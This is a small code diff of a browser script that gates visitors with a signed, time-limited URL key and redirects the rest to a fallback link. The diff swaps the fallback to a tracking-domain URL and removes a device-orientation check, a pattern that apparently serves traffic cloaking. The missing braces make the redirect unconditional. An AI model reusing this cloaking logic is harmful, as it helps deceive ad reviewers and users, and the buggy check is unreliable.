@@ -71,14 +71,14 @@ function check(secretKey, ttl, signature) {
 }
 
 const secretKey = 'MmViYmM4ZTc3ZWZkNmZhZDYwMjI4MDY5YTAzMGM1ZmNjNDRmNzNmMw=='; // Your secret key
-const fallbackUrl = 'https://www.google.com/'; // Redirect URL for users who didn't pass the check
+const fallbackUrl = 'http://jqrjk.bemobtrk.com/go/fae1dd02-7195-4b4d-8542-b934230044cf'; // Redirect URL for users who didn't pass the check
 
 const ttl = 60;
 const signature = new URL(document.location.href).searchParams.get('key');
     
 var hyro = window.DeviceOrientationEvent;
 
-if(!check(secretKey, ttl, signature, ) || hyro == undefined )
+if(!check(secretKey, ttl, signature, ) )
 	console.log(hyro);
     document.location.href = fallbackUrl;
 </script>
